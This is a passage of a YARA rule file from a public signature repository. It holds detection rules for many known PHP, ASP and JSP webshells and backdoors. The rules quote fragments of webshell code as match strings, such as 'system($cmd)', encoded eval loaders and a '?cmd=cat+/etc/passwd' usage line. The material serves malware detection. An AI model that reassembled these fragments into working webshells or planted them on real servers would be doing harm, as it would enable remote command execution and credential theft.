		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5932-L5947"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d2c18766a1cd4dda928c12ff7b519578ccec0769"
		logic_hash = "6cf15a67c311979d32edfb443701cef34ee32d7a672314fc7b60b262b6b2c402"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "http://www.ru24-team.net" fullword
		$s4 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a"
		$s6 = "Ru24PostWebShell"
		$s7 = "Writed by DreAmeRz" fullword
		$s9 = "$function=passthru; // system, exec, cmd" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Hiddens_Shell_V1 {
    meta:
		description = "PHP Webshells Github Archive - file hiddens shell v1.php"
		author = "Florian Roth (Nextron Systems)"
		id = "7194998e-c84c-5f59-92fe-857ecf7e8e88"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5948-L5959"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1674bd40eb98b48427c547bf9143aa7fbe2f4a59"
		logic_hash = "b76400c320e6294b0c831fbbb8e08a9d2097fbb027065f9c4b496d4b005ba016"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_C99_Madnet {
    meta:
		description = "PHP Webshells Github Archive - file c99_madnet.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f2b9c3d1-1c55-59cb-a9bf-8b4011f86a3b"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5960-L5975"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "17613df393d0a99fd5bea18b2d4707f566cff219"
		logic_hash = "cd4048f28405f106302643656ae5f8a257aaec0184a8057a9dffbda9bb857027"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$md5_pass = \"\"; //If no pass then hash" fullword
		$s1 = "eval(gzinflate(base64_decode('"
		$s2 = "$pass = \"pass\";  //Pass" fullword
		$s3 = "$login = \"user\"; //Login" fullword
		$s4 = "             //Authentication" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_C99_Locus7S {
    meta:
		description = "PHP Webshells Github Archive - file c99_locus7s.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f92fe5a2-e465-56ed-a77b-b32ea4c2c105"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5976-L5991"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d413d4700daed07561c9f95e1468fb80238fbf3c"
		logic_hash = "5ecfc5f6da471bd3037228c0bc762d50762933af3cf6674210c7b2017a45a646"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "$encoded = base64_encode(file_get_contents($d.$f)); " fullword
		$s9 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y"
		$s10 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sq"
		$s11 = "$c99sh_sourcesurl = \"http://locus7s.com/\"; //Sources-server " fullword
		$s19 = "$nixpwdperpage = 100; // Get first N lines from /etc/passwd " fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Jspwebshell_1_2 {
    meta:
		description = "PHP Webshells Github Archive - file JspWebshell_1.2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "dfd8c88d-4fe2-5786-9d71-65dba525c358"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5992-L6008"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "0bed4a1966117dd872ac9e8dceceb54024a030fa"
		logic_hash = "13e696c1c671d7fda832c84f150e3f41ed55bf888c4bebfeb06ea68d6be65527"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
		$s1 = "String password=request.getParameter(\"password\");" fullword
		$s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java."
		$s7 = "String editfile=request.getParameter(\"editfile\");" fullword
		$s8 = "//String tempfilename=request.getParameter(\"file\");" fullword
		$s12 = "password = (String)session.getAttribute(\"password\");" fullword

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell_Safe0Ver {
    meta:
		description = "PHP Webshells Github Archive - file safe0ver.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a7fc8c89-f7a1-5958-823a-763dedb3066d"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6009-L6026"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "366639526d92bd38ff7218b8539ac0f154190eb8"
		logic_hash = "ae5de63b79804cf8c99bc5ea0c8862cf05e4085451d2b516cf95565bf32f3876"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "$scriptident = \"$scriptTitle By Evilc0der.com\";" fullword
		$s4 = "while (file_exists(\"$lastdir/newfile$i.txt\"))" fullword
		$s5 = "else { /* <!-- Then it must be a File... --> */" fullword
		$s7 = "$contents .= htmlentities( $line ) ;" fullword
		$s8 = "<br><p><br>Safe Mode ByPAss<p><form method=\"POST\">" fullword
		$s14 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ " fullword
		$s20 = "/* <!-- End of Actions --> */" fullword

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell_Uploader {
    meta:
		description = "PHP Webshells Github Archive - file Uploader.php"
		author = "Florian Roth (Nextron Systems)"
		id = "c68e15d9-865e-5269-a91c-00619fe76305"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6027-L6038"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "e216c5863a23fde8a449c31660fd413d77cce0b7"
		logic_hash = "c4b915f60a952131caa2c4f5bb2eea85ef25f27cabb8ad36a6bb928433558954"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Php_Webshells_Kral {
    meta:
		description = "PHP Webshells Github Archive - file kral.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6039-L6055"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "4cd1d1a2fd448cecc605970e3a89f3c2e5c80dfc"
		logic_hash = "0aded226f4e54c0169b9fbda91458f581ea47f9f8bda61a350b5e6f8b60931f3"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$adres=gethostbyname($ip);" fullword
		$s3 = "curl_setopt($ch,CURLOPT_POSTFIELDS,\"domain=\".$site);" fullword
		$s4 = "$ekle=\"/index.php?option=com_user&view=reset&layout=confirm\";" fullword
		$s16 = "echo $son.' <br> <font color=\"green\">Access</font><br>';" fullword
		$s17 = "<p>kodlama by <a href=\"mailto:priv8coder@gmail.com\">BLaSTER</a><br /"
		$s20 = "<p><strong>Server listeleyici</strong><br />" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Cgitelnet {
    meta:
		description = "PHP Webshells Github Archive - file cgitelnet.php"
		author = "Florian Roth (Nextron Systems)"
		id = "b02d8549-ebfe-522c-9a6d-8657273da3ed"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6056-L6070"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "72e5f0e4cd438e47b6454de297267770a36cbeb3"
		logic_hash = "e9b7096d5a19c9d5423bbfe125ae0347853919ab092efa98f0687a5d0cf68953"
		score = 75
		quality = 60
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s9 = "# Author Homepage: http://www.rohitab.com/" fullword
		$s10 = "elsif($Action eq \"command\") # user wants to run a command" fullword
		$s18 = "# in a command line on Windows NT." fullword
		$s20 = "print \"Transfered $TargetFileSize Bytes.<br>\";" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Simple_Backdoor_2 {
    meta:
		description = "PHP Webshells Github Archive - file simple-backdoor.php"
		author = "Florian Roth (Nextron Systems)"
		id = "faddd38e-d0c6-5299-9983-53351af1ece5"
		date = "2023-12-05"
		modified = "2023-12-05"
		old_rule_name = "WebShell_simple_backdoor"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6071-L6091"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "edcd5157a68fa00723a506ca86d6cbb8884ef512"
		logic_hash = "655e445e51ec0f1bdce006a72acf3bce95941a349c279c14768760fa9f6f9d76"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->" fullword
		$s1 = "<!--    http://michaeldaw.org   2006    -->" fullword
		$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
		$s3 = "        echo \"</pre>\";" fullword
		$s4 = "        $cmd = ($_REQUEST['cmd']);" fullword
		$s5 = "        echo \"<pre>\";" fullword
		$s6 = "if(isset($_REQUEST['cmd'])){" fullword
		$s7 = "        die;" fullword
		$s8 = "        system($cmd);" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Safe_Mode_Bypass_PHP_4_4_2_And_PHP_5_1_2_2 {
    meta:
		description = "PHP Webshells Github Archive - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a504442f-85f2-55a1-8a07-1e0faccf8bc0"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6092-L6106"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8fdd4e0e87c044177e9e1c97084eb5b18e2f1c25"
		logic_hash = "fbe1f77e00fbc4e58cbad564e2d96c0381765ac799dfdf6cc2580428c68f97a5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<option value=\"/etc/passwd\">Get /etc/passwd</option>" fullword
		$s3 = "xb5@hotmail.com</FONT></CENTER></B>\");" fullword
		$s4 = "$v = @ini_get(\"open_basedir\");" fullword
		$s6 = "by PHP Emperor<xb5@hotmail.com>" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Ntdaddy_V1_9 {
    meta:
		description = "PHP Webshells Github Archive - file NTDaddy v1.9.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a175fd28-5dc2-5827-87f0-4117e889e90e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6107-L6121"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "79519aa407fff72b7510c6a63c877f2e07d7554b"
		logic_hash = "fdf8b4bb4980e588ad5ccee2d047660980d39f38617f887c5762dcdb0b858267"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "|     -obzerve : mr_o@ihateclowns.com |" fullword
		$s6 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword
		$s13 = "<form action=ntdaddy.asp method=post>" fullword
		$s17 = "response.write(\"<ERROR: THIS IS NOT A TEXT FILE>\")" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Lamashell {
    meta:
		description = "PHP Webshells Github Archive - file lamashell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "60e39eed-baa2-5999-8560-0a0242ce2608"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6122-L6138"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b71181e0d899b2b07bc55aebb27da6706ea1b560"
		logic_hash = "e58dbd6b9c65a139828890a3fadfad9031580fe189066489d266d37d7078ad98"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "if(($_POST['exe']) == \"Execute\") {" fullword
		$s8 = "$curcmd = $_POST['king'];" fullword
		$s16 = "\"http://www.w3.org/TR/html4/loose.dtd\">" fullword
		$s18 = "<title>lama's'hell v. 3.0</title>" fullword
		$s19 = "_|_  O    _    O  _|_"
		$s20 = "$curcmd = \"ls -lah\";" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Simple_PHP_Backdoor_By_DK {
    meta:
		description = "PHP Webshells Github Archive - file Simple_PHP_backdoor_by_DK.php"
		author = "Florian Roth (Nextron Systems)"
		id = "2c424714-1d2c-5b89-b1bc-a201e37a0a5d"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6139-L6154"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "03f6215548ed370bec0332199be7c4f68105274e"
		logic_hash = "1f65f759ec4045c521085aad84d0aea4dcfcf26eac4357751cf1dde6886d1718"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->" fullword
		$s1 = "<!--    http://michaeldaw.org   2006    -->" fullword
		$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
		$s6 = "if(isset($_REQUEST['cmd'])){" fullword
		$s8 = "system($cmd);" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Moroccan_Spamers_Ma_Edition_By_Ghost {
    meta:
		description = "PHP Webshells Github Archive - file Moroccan Spamers Ma-EditioN By GhOsT.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4fa9ce70-d300-55fe-bf98-636f026317ec"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6155-L6168"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "31e5473920a2cc445d246bc5820037d8fe383201"
		logic_hash = "0e3d2d97665b8849d121d63a22baf7393047a814dde3753e395418c1868b59be"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "$content = chunk_split(base64_encode($content)); " fullword
		$s12 = "print \"Sending mail to $to....... \"; " fullword
		$s16 = "if (!$from && !$subject && !$message && !$emaillist){ " fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_C99Madshell_V__2_0_Madnet_Edition {
    meta:
		description = "PHP Webshells Github Archive - file C99madShell v. 2.0 madnet edition.php"
		author = "Florian Roth (Nextron Systems)"
		id = "51db0495-14f3-527e-865b-1405db57ff27"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6169-L6184"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "f99f8228eb12746847f54bad45084f19d1a7e111"
		logic_hash = "7cf825a604783ebc74b1dca53aaff5c886957c562e11276f2acce5ff1f6ab991"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$md5_pass = \"\"; //If no pass then hash" fullword
		$s1 = "eval(gzinflate(base64_decode('"
		$s2 = "$pass = \"\";  //Pass" fullword
		$s3 = "$login = \"\"; //Login" fullword
		$s4 = "//Authentication" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Cmdasp_Asp_Php {
    meta:
		description = "PHP Webshells Github Archive - file CmdAsp.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "184b1731-31a9-5040-aa25-d145e8064758"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6185-L6204"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "cb18e1ac11e37e236e244b96c2af2d313feda696"
		logic_hash = "0fd9c7e83ad9ddf5cf88f1d1573324d9f24ae03a1951446fe11c116fd0cf4932"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword
		$s4 = "' Author: Maceo <maceo @ dogmile.com>" fullword
		$s5 = "' -- Use a poor man's pipe ... a temp file -- '" fullword
		$s6 = "' --------------------o0o--------------------" fullword
		$s8 = "' File: CmdAsp.asp" fullword
		$s11 = "<-- CmdAsp.asp -->" fullword
		$s14 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
		$s16 = "Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword
		$s19 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword

	condition:
		4 of them
}
rule SIGNATURE_BASE_Webshell_NCC_Shell {
    meta:
		description = "PHP Webshells Github Archive - file NCC-Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "3a2dab3d-faf0-52a5-b114-db402885c618"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6205-L6221"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "64d4495875a809b2730bd93bec2e33902ea80a53"
		logic_hash = "c58edc548b7804be25f6956e9407cc9f8c74dfd8651f601a87ba639284e612d9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = " if (isset($_FILES['probe']) and ! $_FILES['probe']['error']) {" fullword
		$s1 = "<b>--Coded by Silver" fullword
		$s2 = "<title>Upload - Shell/Datei</title>" fullword
		$s8 = "<a href=\"http://www.n-c-c.6x.to\" target=\"_blank\">-->NCC<--</a></center></b><"
		$s14 = "~|_Team .:National Cracker Crew:._|~<br>" fullword
		$s18 = "printf(\"Sie ist %u Bytes gro" fullword

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell_Php_Webshells_README {
    meta:
		description = "PHP Webshells Github Archive - file README.md"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6222-L6234"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ef2c567b4782c994db48de0168deb29c812f7204"
		logic_hash = "aa8a9be74bbac08518d5ba442aa6fa37d3f1b255df48b49ccb9842f5728a49d5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Common php webshells. Do not host the file(s) in your server!" fullword
		$s1 = "php-webshells" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Backupsql {
    meta:
		description = "PHP Webshells Github Archive - file backupsql.php"
		author = "Florian Roth (Nextron Systems)"
		id = "15d6e967-1e53-53b4-a2cf-7786452495d4"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6235-L6250"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "863e017545ec8e16a0df5f420f2d708631020dd4"
		logic_hash = "0126bfad6eb3861e8322ac3e11b4fd95bc8b88597d916e66c6646d7d5529c1d5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$headers .= \"\\nMIME-Version: 1.0\\n\" .\"Content-Type: multipart/mixed;\\n\" ."
		$s1 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog"
		$s2 = "* as email attachment, or send to a remote ftp server by" fullword
		$s16 = "* Neagu Mihai<neagumihai@hotmail.com>" fullword
		$s17 = "$from    = \"Neu-Cool@email.com\";  // Who should the emails be sent from?, may "

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_AK_74_Security_Team_Web_Shell_Beta_Version {
    meta:
		description = "PHP Webshells Github Archive - file AK-74 Security Team Web Shell Beta Version.php"
		author = "Florian Roth (Nextron Systems)"
		id = "e93a6ac3-080f-53d3-8368-b9feb509a2ea"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6251-L6264"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c90b0ba575f432ecc08f8f292f3013b5532fe2c4"
		logic_hash = "4fbf8f5cab8593fd88e5a430b849e61d7d663c13700f459aa516c5b337d5438b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "- AK-74 Security Team Web Site: www.ak74-team.net" fullword
		$s9 = "<b><font color=#830000>8. X Forwarded For IP - </font></b><font color=#830000>'."
		$s10 = "<b><font color=#83000>Execute system commands!</font></b>" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Php_Webshells_Cpanel {
    meta:
		description = "PHP Webshells Github Archive - file cpanel.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6265-L6281"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "433dab17106b175c7cf73f4f094e835d453c0874"
		logic_hash = "e4dc90c52648f1e5b7dc2d77dcb94feb774ec9e3c156c923c54a9e8f537bbf07"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "function ftp_check($host,$user,$pass,$timeout){" fullword
		$s3 = "curl_setopt($ch, CURLOPT_URL, \"http://$host:2082\");" fullword
		$s4 = "[ user@alturks.com ]# info<b><br><font face=tahoma><br>" fullword
		$s12 = "curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);" fullword
		$s13 = "Powerful tool , ftp and cPanel brute forcer , php 5.2.9 safe_mode & open_basedir"
		$s20 = "<br><b>Please enter your USERNAME and PASSWORD to logon<br>" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Accept_Language {
    meta:
		description = "PHP Webshells Github Archive - file accept_language.php"
		author = "Florian Roth (Nextron Systems)"
		id = "343ed2a4-4bed-5e73-8d05-f9573b0147af"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6282-L6293"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "180b13576f8a5407ab3325671b63750adbcb62c9"
		logic_hash = "6d45071722268f5b39b1486a7dce883ecefb2b3c9993357b7b58bd603ff1c40d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php passthru(getenv(\"HTTP_ACCEPT_LANGUAGE\")); echo '<br> by q1w2e3r4'; ?>" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Php_Webshells_529 {
    meta:
		description = "PHP Webshells Github Archive - file 529.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6294-L6311"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ba3fb2995528307487dff7d5b624d9f4c94c75d3"
		logic_hash = "f46b84d51077f157c83cd01534dfe7f9cd0d9ef04ad9935ced22d2abc873c171"
		score = 75
		quality = 85
		tags = ""
